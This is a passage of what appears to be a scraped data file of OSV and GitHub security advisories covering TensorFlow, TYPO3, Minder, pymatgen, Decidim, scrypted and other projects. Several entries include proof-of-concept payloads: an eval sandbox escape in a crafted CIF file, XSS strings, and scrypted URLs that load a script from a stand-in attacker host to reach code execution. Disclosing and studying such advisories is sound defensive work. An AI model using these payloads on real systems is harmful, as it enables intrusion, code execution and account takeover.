            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. Under certain scenarios, Grappler component of TensorFlow can trigger a null pointer dereference. There are 2 places where this can occur, for the same malicious alteration of a `SavedModel` file (fixing the first one would trigger the same dereference in the second place). First, during constant folding, the `GraphDef` might not have the required nodes for the binary operation. If a node is missing, the correposning `mul_*child` would be null, and the dereference in the subsequent line would be incorrect. We have a similar issue during `IsIdentityConsumingSwitch`. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",

        }, {
            "ecosystem": "Bitnami",
            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23592' target='_blank'>BIT-tensorflow-2022-23592</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. TensorFlow&#x27;s type inference can cause a heap out of bounds read as the bounds checking is done in a `DCHECK` (which is a no-op during production). An attacker can control the `input_idx` variable such that `ix` would be larger than the number of values in `node_t.args`. The fix will be included in TensorFlow 2.8.0. This is the only affected version.",

            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-23593' target='_blank'>BIT-tensorflow-2022-23593</a>",
            "details": "<b></b><br>Tensorflow is an Open Source Machine Learning Framework. The `simplifyBroadcast` function in the MLIR-TFRT infrastructure in TensorFlow is vulnerable to a segfault (hence, denial of service), if called with scalar shapes. If all shapes are scalar, then `maxRank` is 0, so we build an empty `SmallVector`. The fix will be included in TensorFlow 2.8.0. This is the only affected version.",

            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-29205' target='_blank'>BIT-tensorflow-2022-29205</a>",
            "details": "<b></b><br>TensorFlow is an open source platform for machine learning. Prior to versions 2.9.0, 2.8.1, 2.7.2, and 2.6.4, there is a potential for segfault &#x2F; denial of service in TensorFlow by calling `tf.compat.v1.*` ops which don&#x27;t yet have support for quantized types, which was added after migration to TensorFlow 2.x. In these scenarios, since the kernel is missing, a `nullptr` value is passed to `ParseDimensionValue` for the `py_value` argument. Then, this is dereferenced, resulting in segfault. Versions 2.9.0, 2.8.1, 2.7.2, and 2.6.4 contain a patch for this issue.",

            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-29210' target='_blank'>BIT-tensorflow-2022-29210</a>",
            "details": "<b></b><br>TensorFlow is an open source platform for machine learning. In version 2.8.0, the `TensorKey` hash function used total estimated `AllocatedBytes()`, which (a) is an estimate per tensor, and (b) is a very poor hash function for constants (e.g. `int32_t`). It also tried to access individual tensor bytes through `tensor.data()` of size `AllocatedBytes()`. This led to ASAN failures because the `AllocatedBytes()` is an estimate of total bytes allocated by a tensor, including any pointed-to constructs (e.g. strings), and does not refer to contiguous bytes in the `.data()` buffer. The discoverers could not use this byte vector anyway because types such as `tstring` include pointers, whereas they needed to hash the string values themselves. This issue is patched in Tensorflow versions 2.9.0 and 2.8.1.",

            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-29211' target='_blank'>BIT-tensorflow-2022-29211</a>",
            "details": "<b></b><br>TensorFlow is an open source platform for machine learning. Prior to versions 2.9.0, 2.8.1, 2.7.2, and 2.6.4, the implementation of `tf.histogram_fixed_width` is vulnerable to a crash when the values array contain `Not a Number` (`NaN`) elements. The implementation assumes that all floating point operations are defined and then converts a floating point result to an integer index. If `values` contains `NaN` then the result of the division is still `NaN` and the cast to `int32` would result in a crash. This only occurs on the CPU implementation. Versions 2.9.0, 2.8.1, 2.7.2, and 2.6.4 contain a patch for this issue.",

            "details": "<b></b><br>TensorFlow is an open source platform for machine learning. The reference kernel of the `CONV_3D_TRANSPOSE` TensorFlow Lite operator wrongly increments the data_ptr when adding the bias to the result. Instead of `data_ptr += num_channels;` it should be `data_ptr += output_num_channels;` as if the number of input channels is different than the number of output channels, the wrong result will be returned and a buffer overflow will occur if num_channels &amp;gt; output_num_channels. An attacker can craft a model with a specific number of input channels. It is then possible to write specific values through the bias of the layer outside the bounds of the buffer. This attack only works if the reference kernel resolver is used in the interpreter. We have patched the issue in GitHub commit 72c0bdcb25305b0b36842d746cc61d72658d2941. The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.",

            "id": "<a href='https://osv.dev/vulnerability/BIT-tensorflow-2022-41911' target='_blank'>BIT-tensorflow-2022-41911</a>",
            "details": "<b></b><br>TensorFlow is an open source platform for machine learning. When printing a tensor, we get it&#x27;s data as a `const char*` array (since that&#x27;s the underlying storage) and then we typecast it to the element type. However, conversions from `char` to `bool` are undefined if the `char` is not `0` or `1`, so sanitizers&#x2F;fuzzers will crash. The issue has been patched in GitHub commit `1be74370327`. The fix will be included in TensorFlow 2.11.0. We will also cherrypick this commit on TensorFlow 2.10.1, TensorFlow 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.",

            "id": "<a href='https://osv.dev/vulnerability/BIT-typo3-2023-24814' target='_blank'>BIT-typo3-2023-24814</a>",
            "details": "<b></b><br>TYPO3 is a free and open source Content Management Framework released under the GNU General Public License. In affected versions the TYPO3 core component `GeneralUtility::getIndpEnv()` uses the unfiltered server environment variable `PATH_INFO`, which allows attackers to inject malicious content. In combination with the TypoScript setting `config.absRefPrefix=auto`, attackers can inject malicious HTML code to pages that have not been rendered and cached, yet. As a result, injected values would be cached and delivered to other website visitors (persisted cross-site scripting). Individual code which relies on the resolved value of `GeneralUtility::getIndpEnv(&#x27;SCRIPT_NAME&#x27;)` and corresponding usages (as shown below) are vulnerable as well. Additional investigations confirmed that at least Apache web server deployments using CGI (FPM, FCGI&#x2F;FastCGI, and similar) are affected. However, there still might be the risk that other scenarios like nginx, IIS, or Apache&#x2F;mod_php are vulnerable. The usage of server environment variable `PATH_INFO` has been removed from corresponding processings in `GeneralUtility::getIndpEnv()`. Besides that, the public property `TypoScriptFrontendController::$absRefPrefix` is encoded for both being used as a URI component and for being used as a prefix in an HTML context. This mitigates the cross-site scripting vulnerability. Users are advised to update to TYPO3 versions 8.7.51 ELTS, 9.5.40 ELTS, 10.4.35 LTS, 11.5.23 LTS and 12.2.0 which fix this problem. For users who are unable to patch in a timely manner the TypoScript setting `config.absRefPrefix` should at least be set to a static path value, instead of using auto - e.g. `config.absRefPrefix=&#x2F;`. This workaround **does not fix all aspects of the vulnerability**, and is just considered to be an intermediate mitigation to the most prominent manifestation.",

            "details": "<b></b><br>Envoy is a cloud-native high-performance edge&#x2F;middle&#x2F;service proxy. Envoy\u2019s HTTP&#x2F;2 codec may leak a header map and bookkeeping structures upon receiving `RST_STREAM` immediately followed by the `GOAWAY` frames from an upstream server. In nghttp2, cleanup of pending requests due to receipt of the `GOAWAY` frame skips de-allocation of the bookkeeping structure and pending compressed header. The error return [code path] is taken if connection is already marked for not sending more requests due to `GOAWAY` frame. The clean-up code is right after the return statement, causing memory leak. Denial of service through memory exhaustion. This vulnerability was patched in versions(s) 1.26.3, 1.25.8, 1.24.9, 1.23.11.",

            "details": "<b></b><br>Akeneo PIM is an open source Product Information Management (PIM). Akeneo PIM Community Edition versions before v5.0.119 and v6.0.53 allows remote authenticated users to execute arbitrary PHP code on the server by uploading a crafted image. Akeneo PIM Community Edition after the versions aforementioned provides patched Apache HTTP server configuration file, for docker setup and in documentation sample, to fix this vulnerability.   Community Edition users must change their Apache HTTP server configuration accordingly to be protected. The patch for Cloud Based Akeneo PIM Services customers has been applied since 30th October 2022. Users are advised to upgrade. Users unable to upgrade may  Replace any reference to `&amp;lt;FilesMatch \\.php$&amp;gt;` in their apache httpd configurations with: `&amp;lt;Location &quot;&#x2F;index.php&quot;&amp;gt;`.",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-v627-69v2-xx37' target='_blank'>GHSA-v627-69v2-xx37</a>",
            "details": "<b>`GetRepositoryByName`, `DeleteRepositoryByName` and `GetArtifactByName` allow access of arbitrary repositories in Minder by any authenticated user</b><br>### Summary\nA Minder user can use the endpoints listed in the issue title to access any repository in the DB, irrespective of who owns the repo and any permissions that user may have.\n \n### Details\n\nhttps:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;e88e4b286e4bc04c03b0332a77961f085e1aa77f&#x2F;database&#x2F;query&#x2F;repositories.sql#L22-L23\nhttps:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;a115c8524fbd582b2b277eaadce024bebbded508&#x2F;internal&#x2F;controlplane&#x2F;handlers_repositories.go#L277-L278\n\nThe DB query used here checks by repo owner, repo name and provider name (which is always &quot;github&quot;). These query values are not distinct for the particular user - as long as the user has valid credentials and a provider, they can set the repo owner&#x2F;name to any value they want and the server will return information on this repo.\n\n`DeleteRepositoryByName` uses the same query and I have been able to delete another user&#x27;s repo using this technique.\n\nThe `GetArtifactByName` endpoint also uses this DB query. I have not reproduced the behaviour with this endpoint due to a lack of a suitable test case, but I do not see anything in the implementation of the endpoint to prevent it being exploited.\n\n### PoC\n\nSetup:\n1. Fresh provider&#x2F;project on the production minder instance which is owned by me.\n2. A repo registered by another user (in this case, Ozz)\n\n```\n# show my identity\n$ minder auth whoami\nNo config file present, using default values.\n\n Here are your details:\n\n+----------------------------------------------------+----------------------------------------------------+\n|                        KEY                         |                       VALUE                        |\n+----------------------------------------------------+----------------------------------------------------+\n| Subject                                            | c93cc12e-999d-49f4-9ee3-593fdfb39204               |\n+----------------------------------------------------+----------------------------------------------------+\n| Created At                                         | 2024-02-26 15:53:29.228 +0000                      |\n|                                                    | UTC                                                |\n+----------------------------------------------------+----------------------------------------------------+\n| Updated At                                         | 2024-02-26 15:53:29.228 +0000                      |\n|                                                    | UTC                                                |\n+----------------------------------------------------+----------------------------------------------------+\n| Minder Server                                      | api.stacklok.com:443                               |\n+----------------------------------------------------+----------------------------------------------------+\n| Project                                            | dmjb &#x2F;                                             |\n|                                                    | ca059552-7b8a-4c6e-918d-ca7e6cbd0bab               |\n+----------------------------------------------------+----------------------------------------------------+\n\n# show that I have no repos registered\n$ minder repo list\nNo config file present, using default values.\n+----+---------+----------+-------------+-------+------+\n| ID | PROJECT | PROVIDER | UPSTREAM ID | OWNER | NAME |\n+----+---------+----------+-------------+-------+------+\n\n# show details on one of Ozz&#x27;s repos\n$ minder repo get -n JAORMX&#x2F;auditevent\nNo config file present, using default values.\n{\n  &quot;id&quot;:  &quot;a7e82080-9b6c-41f3-bc08-8e9442f8b2d2&quot;,\n  &quot;context&quot;:  {\n    &quot;provider&quot;:  &quot;github&quot;,\n    &quot;project&quot;:  &quot;b513f7f0-26dc-42e6-81a0-577df5489e62&quot;\n  },\n  &quot;owner&quot;:  &quot;JAORMX&quot;,\n  &quot;name&quot;:  &quot;auditevent&quot;,\n  &quot;repoId&quot;:  &quot;605597568&quot;,\n  &quot;hookUrl&quot;:  &quot;https:&#x2F;&#x2F;api.github.com&#x2F;repos&#x2F;JAORMX&#x2F;auditevent&#x2F;hooks&#x2F;464564107&quot;,\n  &quot;deployUrl&quot;:  &quot;https:&#x2F;&#x2F;api.github.com&#x2F;repos&#x2F;JAORMX&#x2F;auditevent&#x2F;deployments&quot;,\n  &quot;cloneUrl&quot;:  &quot;https:&#x2F;&#x2F;github.com&#x2F;JAORMX&#x2F;auditevent.git&quot;,\n  &quot;isFork&quot;:  true,\n  &quot;createdAt&quot;:  &quot;2024-03-04T13:27:54.019356Z&quot;,\n  &quot;updatedAt&quot;:  &quot;2024-03-04T13:27:54.019356Z&quot;,\n  &quot;defaultBranch&quot;:  &quot;main&quot;\n}\n\n# delete Ozz&#x27;s repo\n$ minder repo delete -n JAORMX&#x2F;auditevent\nNo config file present, using default values.\nSuccessfully deleted repo with name: JAORMX&#x2F;auditevent\n\n# Ozz&#x27;s repo no longer exists\n$ minder repo get -n JAORMX&#x2F;auditevent\nNo config file present, using default values.\nMessage: Error getting repo by name\nDetails: NotFound means some requested entity (e.g., file or directory) was\nnot found.\n```\n\n### Impact\n\nAny user and project in a multi-tenant Minder instance.",

            "details": "<b>Vyper&#x27;s `extract32` can ready dirty memory</b><br>### Summary\n\nWhen using the built-in `extract32(b, start)`, if the `start` index provided has for side effect to update `b`, the byte array to extract `32` bytes from, it could be that some dirty memory is read and returned by `extract32`.\n\n### Details\n\nBefore evaluating `start`, the function `Extract32.build_IR` caches only:\n\n- The pointer in memory&#x2F;storage to `b`: https:&#x2F;&#x2F;github.com&#x2F;vyperlang&#x2F;vyper&#x2F;blob&#x2F;10564dcc37756f3d3684b7a91fd8f4325a38c4d8&#x2F;vyper&#x2F;builtins&#x2F;functions.py#L916-L918\n- The length of `b`: https:&#x2F;&#x2F;github.com&#x2F;vyperlang&#x2F;vyper&#x2F;blob&#x2F;10564dcc37756f3d3684b7a91fd8f4325a38c4d8&#x2F;vyper&#x2F;builtins&#x2F;functions.py#L920-L922\n\nbut do not cache the actual content of `b`. This means that if the evaluation of `start` changes `b`&#x27;s content and length, an outdated length will be used with the new content when extracting 32 bytes from `b`.\n\n### PoC\n\nCalling the function `foo` of the following contract returns `b&#x27;uuuuuuuuuuuuuuuuuuuuuuuuuuu\\x00\\x00789&#x27;` meaning that `extract32` accessed some dirty memory.\n\n```Vyper\nvar:Bytes[96]\n\n@internal\ndef bar() -&amp;gt; uint256:\n    self.var = b&#x27;uuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&#x27;\n    self.var = b&#x27;&#x27;\n    return 3\n\n@external\ndef foo() -&amp;gt; bytes32:\n    self.var = b&#x27;abcdefghijklmnopqrstuvwxyz123456789&#x27;\n    return extract32(self.var, self.bar(), output_type=bytes32)\n    # returns b&#x27;uuuuuuuuuuuuuuuuuuuuuuuuuuu\\x00\\x00789&#x27;\n```\n\n### Impact\n\nFor contracts that are affected, it means that calling `extract32` returns dirty memory bytes instead of some expected output.",

            "details": "<b>Armeria SAML authentication bypass due to missing validation on unsigned SAML messages</b><br>### Impact\n\nThe SAML implementation provided by `armeria-saml` currently accepts unsigned SAML messages (assertions, logout requests, etc.) as they are, rather than rejecting them by default. As a result, an attacker can forge a SAML message to authenticate themselves, despite the fact that such an unsigned SAML message should be rejected.\n\n### Patches\n\nThe vulnerability has been patched in Armeria version 1.27.2. All users who rely on `armeria-saml` older than version 1.27.2 must upgrade to 1.27.2 or later.\n\n### Workarounds\n\nThere is no known workaround for this vulnerability.\n\n### References\n\n[`SamlMessageUtil.validateSignature()`](https:&#x2F;&#x2F;github.com&#x2F;line&#x2F;armeria&#x2F;blob&#x2F;0efc776988d71be4da6e506ec8a33c2b7b43f567&#x2F;saml&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;linecorp&#x2F;armeria&#x2F;server&#x2F;saml&#x2F;SamlMessageUtil.java#L160-L163)",

            "details": "<b>pymatgen vulnerable to arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string</b><br>### Summary\nA critical security vulnerability exists in the `JonesFaithfulTransformation.from_transformation_str()` method within the `pymatgen` library. This method insecurely utilizes eval() for processing input, enabling execution of arbitrary code when parsing untrusted input. This can be exploited when parsing a maliciously-created CIF file.\n\n### Details\nThe cause of the vulnerability is in [pymatgen&#x2F;symmetry&#x2F;settings.py#L97C1-L111C108](https:&#x2F;&#x2F;github.com&#x2F;materialsproject&#x2F;pymatgen&#x2F;blob&#x2F;master&#x2F;pymatgen&#x2F;symmetry&#x2F;settings.py#L97C1-L111C108). The flawed code segment involves a regular expression operation followed by the use of `eval()`.\n\n#### Vulnerable code\n\n```py\nbasis_change = [\n    re.sub(r&quot;(?&amp;lt;=\\w|\\))(?=\\() | (?&amp;lt;=\\))(?=\\w) | (?&amp;lt;=(\\d|a|b|c))(?=([abc]))&quot;, r&quot;*&quot;, string, flags=re.X)\n    for string in basis_change\n]\n&quot;&quot;&quot;snip&quot;&quot;&quot;\n([eval(x, {&quot;__builtins__&quot;: None}, {&quot;a&quot;: a, &quot;b&quot;: b, &quot;c&quot;: c}) for x in basis_change])\n```\n\nThe use of eval, even with `__builtins__` set to `None`, is still a security risk. The `BuiltinImporter` class can be recovered with subclass traversal.\n\n### PoC\n\nThe vulnerability can be exploited as follows:\n\nCreate a file `vuln.cif` with the following contents:\n\n```\ndata_5yOhtAoR\n_audit_creation_date            2018-06-08\n_audit_creation_method          &quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;\n\nloop_\n_parent_propagation_vector.id\n_parent_propagation_vector.kxkykz\nk1 [0 0 0]\n\n_space_group_magn.transform_BNS_Pp_abc  &#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;touch pwned&quot;);0,0,0&#x27;\n\n\n_space_group_magn.number_BNS  62.448\n_space_group_magn.name_BNS  &quot;P  n&#x27;  m  a&#x27;  &quot;\n```\n\nThen, parse the cif file with the following code:\n```py\nfrom pymatgen.io.cif import CifParser\nparser = CifParser(&quot;vuln.cif&quot;)\nstructure = parser.parse_structures()\n```\n\n### Credits\n\nThis vulnerability was found and disclosed by [William Khem-Marquez](https:&#x2F;&#x2F;github.com&#x2F;SteakEnthusiast).",

            "details": "<b>Cross-site scripting (XSS) in the dynamic file uploads</b><br>### Impact\nThe dynamic file upload feature is subject to potential XSS attach in case the attacker manages to modify the file names of the records being uploaded to the server.\n\nThis appears in sections where the user controls the file upload dialogs themselves and has the technical knowledge to change the file names through the dynamic upload endpoint. Therefore I believe it would require the attacker to control the whole session of the particular user but in any case, this needs to be fixed.\n\nSuccessful exploit of this vulneratibility would require the user to have successfully uploaded a file blob to the server with a malicious file name and then have the possibility to direct the other user to the edit page of the record where the attachment is attached.\n\nThe users are able to craft the direct upload requests themselves controlling the file name that gets stored to the database as shown here:\nhttps:&#x2F;&#x2F;github.com&#x2F;rails&#x2F;rails&#x2F;blob&#x2F;a967d355c6fee9ad9b8bd115d43bc8b0fc207e7e&#x2F;activestorage&#x2F;app&#x2F;controllers&#x2F;active_storage&#x2F;direct_uploads_controller.rb#L14\n\nThe attacker is able to change the filename e.g. to `&amp;lt;svg onload=alert(&#x27;XSS&#x27;)&amp;gt;` if they know how to craft these requests themselves. And then enter the returned blob ID to the form inputs manually by modifying the edit page source.\n\nTherefore, anywhere we display these strings, we should properly escape them.\n\n### Patches\nPR #11612 fixes this problem both for 0.28.dev and 0.27.x.\n\n### Workarounds\nDisable dynamic uploads for the instance, e.g. from proposals.\n\n### References\nOWASP ASVS v4.0.3-5.1.3\n\n### Credits\nThis issue was discovered in City of Helsinki&#x27;s security audit against Decidim 0.27 done during September 2023. The security audit was implemented by [Deloitte Finland](https:&#x2F;&#x2F;www2.deloitte.com&#x2F;fi&#x2F;fi.html).\n",

            "details": "<b>Possibility to circumvent the invitation token expiry period</b><br>### Impact\nThe invites feature allows users to accept the invitation for an unlimited amount of time through the password reset functionality.\n\nWhen using the password reset functionality, the `devise_invitable` gem always accepts the pending invitation if the user has been invited as shown in this piece of code within the `devise_invitable` gem:\nhttps:&#x2F;&#x2F;github.com&#x2F;scambra&#x2F;devise_invitable&#x2F;blob&#x2F;41f58970ff76fb64382a9b9ea1bd530f7c3adab2&#x2F;lib&#x2F;devise_invitable&#x2F;models.rb#L198\n\nThe only check done here is if the user has been invited but the code does not ensure that the pending invitation is still valid as defined by the `invite_for` expiry period as explained in the gem&#x27;s documentation:\nhttps:&#x2F;&#x2F;github.com&#x2F;scambra&#x2F;devise_invitable#model-configuration-\n\n&amp;gt; `invite_for`: The period the generated invitation token is valid. After this period, the invited resource won\u2019t be able to accept the invitation. When `invite_for` is `0` (the default), the invitation won\u2019t expire.\n\nDecidim sets this configuration to `2.weeks` so this configuration should be respected:\nhttps:&#x2F;&#x2F;github.com&#x2F;decidim&#x2F;decidim&#x2F;blob&#x2F;d2d390578050772d1bdb6d731395f1afc39dcbfc&#x2F;decidim-core&#x2F;config&#x2F;initializers&#x2F;devise.rb#L134\n\nThe bug is in the `devise_invitable` gem and should be fixed there and the dependency should be upgraded in Decidim once the fix becomes available.\n\n### Patches\nUpdate `devise_invitable` to version `2.0.9` or above by running the following command:\n\n```\n$ bundle update devise_invitable\n```\n\n### Workarounds\nThe invitations can be cancelled directly from the database by running the following command from the Rails console:\n\n```\n&amp;gt; Decidim::User.invitation_not_accepted.update_all(invitation_token: nil)\n```\n\n### References\nOWASP ASVS V4.0.3-2.3.1\n\nThis bug has existed in the `devise_invitable` gem since this commit which was first included in the `v0.4.rc3` release of this gem:\nhttps:&#x2F;&#x2F;github.com&#x2F;scambra&#x2F;devise_invitable&#x2F;commit&#x2F;94d859c7de0829bf63f679ae5dd3cab2b866a098\n\nAll versions since then are affected.\n\nThis gem was first introduced at its version `~&amp;gt; 1.7.0` to the `decidim-admin` gem in this commit which was first included in the `v0.0.1.alpha3` release of Decidim:\nhttps:&#x2F;&#x2F;github.com&#x2F;decidim&#x2F;decidim&#x2F;commit&#x2F;073e60e2e4224dd81815a784002ebba30f2ebb34\n\nIt was first introduced at its version `~&amp;gt; 1.7.0` to the `decidim-system` gem in this commit which was also first included in the `v0.0.1.alpha3` release of Decidim:\nhttps:&#x2F;&#x2F;github.com&#x2F;decidim&#x2F;decidim&#x2F;commit&#x2F;b12800717a689c295a9ea680a38ca9f823d2c454\n\n### Credits\nThis issue was discovered in City of Helsinki&#x27;s security audit against Decidim 0.27 done during September 2023. The security audit was implemented by [Deloitte Finland](https:&#x2F;&#x2F;www2.deloitte.com&#x2F;fi&#x2F;fi.html).",

            "details": "<b></b><br>Decidim is a participatory democracy framework. Starting in version 0.4.rc3 and prior to version 2.0.9 of the `devise_invitable` gem, the invites feature allows users to accept the invitation for an unlimited amount of time through the password reset functionality. This issue creates vulnerable dependencies starting in version 0.0.1.alpha3 and prior to versions 0.26.9, 0.27.5, and 0.28.0 of the `decidim,` `decidim-admin`, and `decidim-system` gems. When using the password reset functionality, the `devise_invitable` gem always accepts the pending invitation if the user has been invited. The only check done is if the user has been invited but the code does not ensure that the pending invitation is still valid as defined by the `invite_for` expiry period. Decidim sets this configuration to `2.weeks` so this configuration should be respected. The bug is in the `devise_invitable` gem and should be fixed there and the dependency should be upgraded in Decidim once the fix becomes available. `devise_invitable` to version `2.0.9` and above fix this issue. Versions 0.26.9, 0.27.5, and 0.28.0 of the `decidim,` `decidim-admin`, and `decidim-system` gems contain this fix. As a workaround, invitations can be cancelled directly from the database.",

            "details": "<b>Possible CSRF attack at questionnaire templates preview</b><br>### Impact\nThe CSRF authenticity token check is currently disabled for the questionnaire templates preview as per:\nhttps:&#x2F;&#x2F;github.com&#x2F;decidim&#x2F;decidim&#x2F;blob&#x2F;3187bdfd40ea1c57c2c12512b09a7fec0b2bed08&#x2F;decidim-templates&#x2F;app&#x2F;controllers&#x2F;decidim&#x2F;templates&#x2F;admin&#x2F;questionnaire_templates_controller.rb#L11\n\nThis was introduced by this commit in the PR that introduced this feature (#6247):\nhttps:&#x2F;&#x2F;github.com&#x2F;decidim&#x2F;decidim&#x2F;pull&#x2F;6247&#x2F;commits&#x2F;5542227be66e3b6d7530f5b536069bce09376660\n\nThe issue does not imply a serious security thread as you need to have access also to the session cookie in order to see this resource. This URL does not allow modifying the resource but it may allow attackers to gain access to information which was not meant to be public.\n\n### Patches\n#11743\n\n### Workarounds\nDisable the templates functionality or remove all available templates.\n\n### References\n#11743",

            "details": "<b></b><br>Misskey is an open source, decentralized social media platform with ActivityPub support. Prior to version 2024.2.0, when fetching remote Activity Streams objects, Misskey doesn&#x27;t check that the response from the remote server has a `Content-Type` header value of the Activity Streams media type, which allows a threat actor to upload a crafted Activity Streams document to a remote server and make a Misskey instance fetch it, if the remote server accepts arbitrary user uploads. The vulnerability allows a threat actor to impersonate and take over an account on a remote server that satisfies all of the following properties: allows the threat actor to register an account; accepts arbitrary user-uploaded documents and places them on the same domain as legitimate Activity Streams actors; and serves user-uploaded document in response to requests with an `Accept` header value of the Activity Streams media type. Version 2024.2.0 contains a patch for the issue.",

            "details": "<b>GitHub Security Lab (GHSL) Vulnerability Report, scrypted: `GHSL-2023-218`, `GHSL-2023-219`</b><br># GitHub Security Lab (GHSL) Vulnerability Report, scrypted: `GHSL-2023-218`, `GHSL-2023-219`\n\nThe [GitHub Security Lab](https:&#x2F;&#x2F;securitylab.github.com) team has identified potential security vulnerabilities in [scrypted](https:&#x2F;&#x2F;github.com&#x2F;koush&#x2F;scrypted).\n\nWe are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.\n\nIf at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2023-218` or `GHSL-2023-219` as a reference). See also [this blog post](https:&#x2F;&#x2F;github.blog&#x2F;2022-04-22-removing-the-stigma-of-a-cve&#x2F;) written by GitHub&#x27;s Advisory Curation team which explains what CVEs and advisories are, why they are important to track vulnerabilities and keep downstream users informed, the CVE assigning process, and how they are used to keep open source software secure.\n\nIf you are _NOT_ the correct point of contact for this report, please let us know!\n\n## Summary\n\nTwo refelcted Cross-Site Scripting (XSS) vulnerabilities exist in scrypted that may allow an attacker to impersonate any user who clicks on specially crafted links. In the worst case, an attacker may be able to impersonate an administrator and run arbitrary commands.\n\n## Project\n\nscrypted\n\n## Tested Version\n\n[v55.0](https:&#x2F;&#x2F;github.com&#x2F;koush&#x2F;scrypted&#x2F;releases&#x2F;tag&#x2F;v0.55.0)\n\n## Details\n\n### Issue 1: reflected XSS in [`plugin-http.ts`](https:&#x2F;&#x2F;github.com&#x2F;koush&#x2F;scrypted&#x2F;blob&#x2F;71cbe83a2a20f743342df695ca7b98482b73e60f&#x2F;server&#x2F;src&#x2F;plugin&#x2F;plugin-http.ts#L45) (`GHSL-2023-218`)\n\nThe `owner` and `pkg` parameters are reflected back in the response when the endpoint is not found, allowing for a reflected XSS vulnerability.\n\n```javascript\nconst { owner, pkg } = req.params;\n        let endpoint = pkg;\n        if (owner)\n            endpoint = `@${owner}&#x2F;${endpoint}`;\n        const pluginData = await this.getEndpointPluginData(req, endpoint, isUpgrade, isEngineIOEndpoint);\n\n        if (!pluginData) {\n            end(404, `Not Found (plugin or device &quot;${endpoint}&quot; not found)`);\n            return;\n        }\n\n\n```\n\n#### Impact\n\nThis issue may lead to `Remote Code Execution`.\n\n#### Remediation\n\nIn order to remediate, ensure that parameters are not reflected back in the response. In addition, on error responses where html is unnecessary, set the `text&#x2F;plain` Content-Type to prevent XSS (express defaults to text&#x2F;html).\n\n#### Resources\n\nProof of Concept:\n\nThe following url will create a script tag in the current document which will load `attacker.domain&#x2F;rce.js`. This JavaScript file can then be used to communicate with the server over HTTP via RPC, and send some requests to get the `nativeId` and `proxyID` for the `automation:update-plugins` and achieve the ability to run shell commands at a specified time.\n\nhttps:&#x2F;&#x2F;localhost:10443&#x2F;endpoint&#x2F;%3Cimg%20src%20onerror=a=document.createElement(&#x27;script&#x27;);a.setAttribute(&#x27;src&#x27;,document.location.hash.substr(1));document.head.appendChild(a)%3E&#x2F;pkg#&#x2F;&#x2F;attacker.domain&#x2F;rce.js\n\nIn the browser, you should see the script element be created with the src as `https:&#x2F;&#x2F;attacker.domain&#x2F;rce.js`.\n\n### Issue 2: reflected XSS in [`plugins&#x2F;core&#x2F;ui&#x2F;src&#x2F;Login.vue`](https:&#x2F;&#x2F;github.com&#x2F;koush&#x2F;scrypted&#x2F;blob&#x2F;v0.55.0&#x2F;plugins&#x2F;core&#x2F;ui&#x2F;src&#x2F;Login.vue#L79) (`GHSL-2023-219`)\n\nA reflected XSS vulnerability exists in the login page via the `redirect_uri` parameter. By specifying a url with the javascript scheme (`javascript:`), an attacker can run arbitrary JavaScript code after the login.\n\n```javascript\n  try {\n          const redirect_uri = new URL(window.location).searchParams.get(&#x27;redirect_uri&#x27;);\n          if (redirect_uri) {\n            window.location = redirect_uri;\n            return;\n          }\n\n        }\n```\n\n#### Impact\n\nThis issue may lead to `Remote Code Execution`.\n\n#### Remediation\n\nIn order to remediate, ensure user-controlled data is not placed into the DOM. Additionally, this is also an open redirect vulnerability because the url is not validated and a user may be redirected to an attacker controlled website after logging in, not knowing they have left the actual real  website. If this redirect_uri parameter is supposed to only redirect to the current website&#x2F;domain, please incorporate a check that it is only redirecting to the current domain.\n\n#### Resources\nProof of Concept:\n\nWhen the user is not logged in, send a link to the server with the parameter:\n\n `redirect_uri=javascript:var script = document.createElement(&#x27;script&#x27;);script.src = &#x27;https:&#x2F;&#x2F;attacker.domain&#x27;; document.head.appendChild(script);`\n\nat the end of the uri (but before the #).\n\n\nExample: `https:&#x2F;&#x2F;localhost:10443&#x2F;endpoint&#x2F;test&#x2F;test?redirect_uri=javascript:var%20script%20=%20document.createElement(&#x27;script&#x27;);script.src%20=%20&#x27;https:&#x2F;&#x2F;attacker.domain&#x27;;%20document.head.appendChild(script);#&#x2F;&#x2F;`\n\n\nSimilar to Proof of Concept 1 this will load a JavaScript file which can make authenticated requests to the server, possibly leading to RCE.\n\n## GitHub Security Advisories\n\nWe recommend you create a private [GitHub Security Advisory](https:&#x2F;&#x2F;help.github.com&#x2F;en&#x2F;github&#x2F;managing-security-vulnerabilities&#x2F;creating-a-security-advisory) for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are [published](https:&#x2F;&#x2F;help.github.com&#x2F;en&#x2F;github&#x2F;managing-security-vulnerabilities&#x2F;publishing-a-security-advisory).\n\n## Credit\n\nThese issues were discovered and reported by GHSL team member [@Kwstubbs (Kevin Stubbings)](https:&#x2F;&#x2F;github.com&#x2F;Kwstubbs).\nThis vulnerability was found with the help of [CodeQL Reflected XSS 